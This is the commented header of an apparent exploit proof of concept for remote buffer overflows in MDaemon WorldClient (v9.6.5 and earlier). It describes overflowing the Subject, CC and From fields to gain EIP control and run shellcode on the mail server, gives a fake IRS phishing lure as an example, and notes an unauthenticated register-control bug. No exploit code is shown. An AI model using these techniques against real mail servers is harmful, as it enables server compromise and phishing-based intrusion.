# MDaemon <== v9.6.5 Multiple Remote Buffer Overflow
#
# Vendor Site: http://altn.com
#
# Risk : Highly Critical
# hehe funny bugs here .. the worldclient use the port 3000 for a webmail like (it use also an admin webmail
# located at
# port 1000 [by default both are opened])
# this file unfortunatly contain multiple buffer overflows , If you send a message to a user ( or postmaster ? :] )
# with a subject composed of 8194 A ( like : " Do your incomming taxes online this year, it's safe and fast,just reply with
# the supplied incomming form...8100 A " from incomming@irs.gov etc )
# if the user click "answer" to the message , eip get owned
# the CC & From field is vulnerable too .
#
# This kind of bug is pretty nasty, because the client doesn't get owned , but postmaster yes. so if you have an account
# on a host providing MDaemon services ,
# you can send a mail to yourself and get some shellcode executed on the server.
# if you dont ... just have a look on google,you'll find out
#
#
# this poc is another bug, actually it shouldn't work, because we dont have any cookie & session ,but it give a full control
# over EDX without any auth, dont ask why, it's like this only for this variable [ComposeUser] =)
#
# Greetz to : French/Quebec security community & http://spiritofhack.net .
# ungreetz to : they'll reconize them =)
#
# Ps: actually this audit is NOT finished ... there might be some other remote bugs/advisory , i just dont have time for
# this at the moment, i recommend to the ones who want to do it , to look at Webclient.exe & Webadmin.exe , there's
# some funny stuff in there hehe .
